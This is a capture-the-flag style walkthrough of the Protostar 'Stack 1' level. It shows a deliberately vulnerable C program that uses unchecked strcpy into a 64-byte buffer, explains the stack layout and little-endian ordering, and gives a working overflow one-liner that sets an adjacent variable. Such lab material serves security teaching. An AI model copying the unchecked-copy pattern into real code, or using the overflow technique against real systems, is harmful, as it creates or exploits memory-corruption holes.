# Protostar - Stack 1

### About ###

>This level looks at the concept of modifying variables to specific values in the program, and > how the variables are laid out in memory.
>
> This level is at `/opt/protostar/bin/stack1`
>
> **Hints :**
>
- If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
- Protostar is little endian

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### Solution ###

In this exercise, we need to change the variable `modified` to a specific value: `0x61626364` or `0x64636261` in little endian.

`buffer` still is 64 characters long and followed by `modified`. Therefore, if we give as parameter to the program the string formed by 64 `A` followed by `0x61626364`, the stack frame will look like:


`main` Stack Frame variables | `main` Stack Frame values
---:|:---
buffer[0:3] | `0x41414141`
buffer[4:7] | `0x41414141`
... | `0x41414141`
buffer[60:63] | `0x41414141`
modified | `0x64636261`
Saved ebp | `0xbffff7f8`

And if we apply this reasoning to the actual program, we are able to correctly change the value of `modified`.

```
user@protostar:/tmp$ stack1 $(python -c "print 'A'*64+'\x64\x63\x62\x61'")
you have correctly got the variable to the right value
```